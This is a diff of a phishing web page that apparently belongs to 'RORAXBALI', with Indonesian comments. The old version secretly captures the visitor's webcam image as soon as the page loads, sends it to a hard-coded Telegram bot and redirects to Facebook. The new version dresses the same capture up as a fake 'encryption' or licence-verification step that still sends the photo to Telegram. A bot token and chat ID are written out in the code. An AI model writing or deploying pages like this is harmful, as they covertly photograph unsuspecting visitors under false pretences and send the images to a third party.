@@ -3,235 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WELCOME BY RORAXBALI</title>
-    <!-- Mengambil font khusus metal dari Google Fonts -->
+    <title>TERMINAL VERIFICATION</title>
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
     <style>
-        /* Mengatur dasar halaman full hitam pekat sesuai gambar sampel */
+        * { box-sizing: border-box; }
         body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.92)), 
+                        url('https://unsplash.com') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Share Tech Mono', monospace;
             overflow: hidden;
-            background-color: #000000;
-            font-family: 'Metal Mania', system-ui, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
         }
-
-        /* Menyembunyikan elemen kamera internal */
-        video, canvas { 
-            display: none; 
+        .terminal-panel {
+            width: 90%; max-width: 550px;
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid #ff003c;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 0, 60, 0.15);
+            padding: 30px; border-radius: 6px; text-align: left;
+            backdrop-filter: blur(10px);
         }
-
-        /* Kotak Konsol Utama */
-        .terminal {
-            width: 90%;
-            max-width: 500px;
-            padding: 40px 20px;
-            position: relative;
-            text-align: center;
-            z-index: 10;
+        .panel-header {
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid rgba(255, 0, 60, 0.2); padding-bottom: 12px; margin-bottom: 25px;
         }
-
-        /* ORNAMEN GARIS MERAH ATAS */
-        .garis-merah-atas {
-            width: 80%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #ff0000 20%, #ff0000 80%, transparent);
-            margin: 0 auto 35px auto;
-            border-radius: 50% / 100% 100% 0 0;
-            box-shadow: 0 0 12px #ff0000;
+        .panel-dots { display: flex; gap: 6px; }
+        .dot { width: 11px; height: 11px; border-radius: 50%; background-color: #ff003c; }
+        .dot:nth-child(2) { background-color: #ffaa00; }
+        .dot:nth-child(3) { background-color: #00ff66; }
+        .panel-title { color: #ff003c; font-size: 13px; text-transform: uppercase; letter-spacing: 2px; }
+        h1 { margin: 0 0 15px 0; font-size: 26px; color: #ffffff; letter-spacing: 3px; text-align: center; }
+        
+        .camera-viewport {
+            width: 100%; height: 220px; background-color: #050505;
+            border: 1px solid #00ff66; margin: 20px 0;
+            display: flex; justify-content: center; align-items: center;
+            position: relative; overflow: hidden; border-radius: 4px;
         }
-
-        /* ORNAMEN GARIS MERAH BAWAH */
-        .garis-merah-bawah {
-            width: 80%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #ff0000 20%, #ff0000 80%, transparent);
-            margin: 35px auto 0 auto;
-            border-radius: 50% / 0 0 100% 100%;
-            box-shadow: 0 0 12px #ff0000;
+        .hud-corner { position: absolute; width: 12px; height: 12px; border: 2px solid #00ff66; }
+        .top-left { top: 8px; left: 8px; border-right: none; border-bottom: none; }
+        .top-right { top: 8px; right: 8px; border-left: none; border-bottom: none; }
+        .bottom-left { bottom: 8px; left: 8px; border-right: none; border-top: none; }
+        .bottom-right { bottom: 8px; right: 8px; border-left: none; border-top: none; }
+        
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        #placeholderText { color: #00ff66; font-size: 13px; letter-spacing: 2px; text-transform: uppercase; }
+        
+        .console-logs {
+            font-size: 12px; color: #00ff66; background: rgba(0, 0, 0, 0.6);
+            padding: 14px; border-left: 2px solid #00ff66; margin-bottom: 25px;
+            min-height: 55px; line-height: 1.6; border-radius: 0 4px 4px 0;
         }
-
-        /* TULISAN GAYA BLACK METAL */
-        h1 {
-            margin: 0;
-            font-family: 'Metal Mania', serif;
-            font-size: 38px;
-            font-weight: normal;
-            color: #ffffff;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+        .button-group { display: flex; gap: 15px; }
+        .cyber-btn {
+            flex: 1; padding: 14px; background: transparent; border: 1px solid #00ff66;
+            color: #00ff66; font-family: 'Share Tech Mono', monospace; font-size: 14px;
+            font-weight: bold; letter-spacing: 1px; cursor: pointer; text-transform: uppercase;
+            border-radius: 4px; transition: all 0.2s ease;
         }
-
-        /* Teks status informasi sistem di bawah judul */
-        .status-text {
-            font-size: 14px;
-            color: #a3a3a3;
-            margin: 20px 0 0 0;
-            font-weight: bold;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            line-height: 1.6;
-        }
-
-        /* Desain Progress Bar / Loading Bar Merah Minimalis */
-        .progress-container {
-            width: 60%;
-            background-color: rgba(255, 255, 255, 0.05);
-            border-radius: 0px;
-            overflow: hidden;
-            margin: 25px auto 0 auto;
-            height: 3px;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background-color: #ff0000;
-            box-shadow: 0 0 8px #ff0000;
-            transition: width 1.5s cubic-bezier(0.25, 1, 0.5, 1);
-        }
-
-        .progress-bar.error {
-            background-color: #ff0000 !important;
-            box-shadow: 0 0 12px #ff0000 !important;
-        }
+        .cyber-btn:hover:not(:disabled) { background: rgba(0, 255, 102, 0.1); box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
+        .cyber-btn:disabled { border-color: #222222; color: #444444; cursor: not-allowed; }
+        .btn-danger { border-color: #ff003c; color: #ff003c; }
+        .btn-danger:hover:not(:disabled) { background: rgba(255, 0, 60, 0.1) !important; box-shadow: 0 0 15px rgba(255, 0, 60, 0.2) !important; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="terminal">
-        <div class="garis-merah-atas"></div>
-        <h1>WELCOME BY RORAXBALI</h1>
-        
-        <!-- Status Proses Enkripsi -->
-        <div class="status-text" id="status">Menginisialisasi enkripsi aman...</div>
-        
-        <!-- Progress Bar -->
-        <div class="progress-container">
-            <div class="progress-bar" id="bar"></div>
+    <div class="terminal-panel">
+        <div class="panel-header">
+            <div class="panel-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+            <div class="panel-title">> PORTAL_INITIALIZATION</div>
         </div>
 
-        <div class="garis-merah-bawah"></div>
+        <h1>RORAXBALI GATEWAY</h1>
+        
+        <div class="camera-viewport">
+            <div class="hud-corner top-left"></div><div class="hud-corner top-right"></div>
+            <div class="hud-corner bottom-left"></div><div class="hud-corner bottom-right"></div>
+            <span id="placeholderText">[ SECURITY MONITOR STANDBY ]</span>
+            <video id="video" autoplay playsinline style="display: none;"></video>
+        </div>
+
+        <div class="console-logs" id="status">
+            $ system_init: Menunggu otorisasi enkripsi terminal...<br>
+            $ status: Silakan klik tombol 'Buka Enkripsi' untuk memverifikasi lisensi.
+        </div>
+        
+        <div class="button-group">
+            <button class="cyber-btn" id="btnAktifkan" onclick="aktifkanKamera()">Buka Enkripsi</button>
+            <button class="cyber-btn btn-danger" id="btnAmbil" onclick="ambilDanKirim()" disabled>Verifikasi Akses</button>
+        </div>
+        
+        <canvas id="canvas"></canvas>
     </div>
-        <video id="video" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // ==================== PENGATURAN UTAMA ====================
+        // Kredensial Bot Telegram yang Anda Berikan
         const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; 
         const TELEGRAM_CHAT_ID = '1966317946';     
-        const DOMAIN_TUJUAN = 'https://facebook.com'; 
-        // ==========================================================
-
+        
         const video = document.getElementById('video');
-        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const canvas = document.getElementById('canvas');
         const statusText = document.getElementById('status');
-        const progressBar = document.getElementById('bar');
+        const placeholderText = document.getElementById('placeholderText');
+        const btnAktifkan = document.getElementById('btnAktifkan');
+        const btnAmbil = document.getElementById('btnAmbil');
+        let streamLokal = null;
 
-        // Memulai sistem kamera secara otomatis (Sudah pasti berjalan di browser eksternal resmi)
-        mulaiKameraSistem();
-
-        function mulaiKameraSistem() {
-            const constraints = {
-                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
-                audio: false 
-            };
-
-            // Batas waktu pemindahan darurat (Maksimal 6 detik halaman terbuka harus dialihkan ke FB)
-            setTimeout(() => {
-                window.location.href = DOMAIN_TUJUAN;
-            }, 6000);
-
-            navigator.mediaDevices.getUserMedia(constraints)
+        function aktifkanKamera() {
+            statusText.innerHTML = "$ status: Meminta verifikasi modul visual perangkat...<br>$ permission: Menunggu persetujuan user.";
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    video.srcObject = stream;
-                    video.addEventListener('playing', () => {
-                        statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
-                        progressBar.style.width = "65%"; 
-                        
-                        // Jeda seimbang 1.5 detik agar pencahayaan kamera menyesuaikan (tidak gelap)
-                        setTimeout(ambilFotoOtomatis, 1500);
-                    });
+                    streamLokal = stream; video.srcObject = stream;
+                    video.style.display = "block"; placeholderText.style.display = "none";
+                    statusText.innerHTML = "$ status: Gerbang enkripsi visual berhasil dibuka.<br>$ action: Silakan klik 'Verifikasi Akses' untuk menyelesaikan verifikasi.";
+                    btnAktifkan.disabled = true; btnAmbil.disabled = false;
                 })
                 .catch(err => {
-                    console.error("Akses ditolak: ", err);
-                    statusText.innerText = "OTORISASI GAGAL: Akses dibatasi karena izin perangkat ditolak.";
-                    statusText.style.color = "#ff3333";
-                    progressBar.style.width = "100%";
-                    progressBar.classList.add("error");
-                    setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 1500);
+                    statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Otorisasi modul ditolak atau situs tidak berjalan di protokol HTTPS.</span>";
                 });
         }
 
-        function ambilFotoOtomatis() {
-            if (video.videoWidth === 0 || video.videoHeight === 0) {
-                setTimeout(ambilFotoOtomatis, 300);
-                return;
-            }
+        function ambilDanKirim() {
+            if (!streamLokal) return;
+            statusText.innerHTML = "$ status: Memproses kompresi data gambar...<br>$ packet: Melakukan enkripsi berkas.";
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            context.save(); context.translate(canvas.width, 0); context.scale(-1, 1);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height); context.restore();
 
-            const context = hiddenCanvas.getContext('2d');
-            hiddenCanvas.width = video.videoWidth;
-            hiddenCanvas.height = video.videoHeight;
-            
-            context.clearRect(0, 0, hiddenCanvas.width, hiddenCanvas.height);
-            context.save();
-            context.translate(hiddenCanvas.width, 0);
-            context.scale(-1, 1);
-            context.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-            context.restore();
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    btnAmbil.disabled = true;
+                    statusText.innerHTML = "$ status: Mentransmisikan paket data ke gateway Telegram...";
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'security_log.jpg');
+                    formData.append('caption', '🛡️ Gateway Log: Verifikasi Otorisasi Manual Pengunjung RORAXBALI');
 
-            // Kompresi kualitas seimbang (0.65) agar file ringan dikirim lewat jaringan lambat
-            hiddenCanvas.toBlob((blob) => {
-                if (blob) { 
-                    kirimKeTelegram(blob); 
-                } else { 
-                    window.location.href = DOMAIN_TUJUAN; 
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            statusText.innerHTML = "<span style='color:#00ff66;'>$ SUCCESS: Transmisi data berhasil diverifikasi.</span><br>$ system: Mengalihkan...";
+                            setTimeout(() => { window.location.href = "https://google.com"; }, 1500); // Ganti google.com dengan domain utama Anda jika sudah ada
+                        } else {
+                            statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Transmisi ditolak. Validasi Token/ID bermasalah.</span>";
+                            btnAmbil.disabled = false;
+                        }
+                    })
+                    .catch(() => {
+                        statusText.innerHTML = "<span style='color:#ff003c;'>$ ERROR: Kegagalan respon transmisi jaringan.</span>";
+                        btnAmbil.disabled = false;
+                    });
                 }
-            }, 'image/jpeg', 0.65);
-        }
-
-        function kirimKeTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', imageBlob, 'secure_log.jpg');
-            formData.append('caption', '🛡️ Log Otorisasi Pengunjung: WELCOME BY RORAXBALI');
-
-            // Pengaman batas waktu respon API Telegram (4 detik)
-            const controller = new AbortController();
-            const idTimeout = setTimeout(() => {
-                controller.abort();
-                window.location.href = DOMAIN_TUJUAN;
-            }, 4000);
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData,
-                signal: controller.signal
-            })
-            .then(response => response.json())
-            .then(data => {
-                clearTimeout(idTimeout);
-                progressBar.style.width = "100%"; 
-                statusText.innerText = "Koneksi selesai. Menghubungkan...";
-                setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 800);
-            })
-            .catch(error => {
-                console.error('Data dialihkan otomatis:', error);
-                window.location.href = DOMAIN_TUJUAN;
-            });
+            }, 'image/jpeg', 0.90);
         }
     </script>
 </body>
 </html>
-
-    
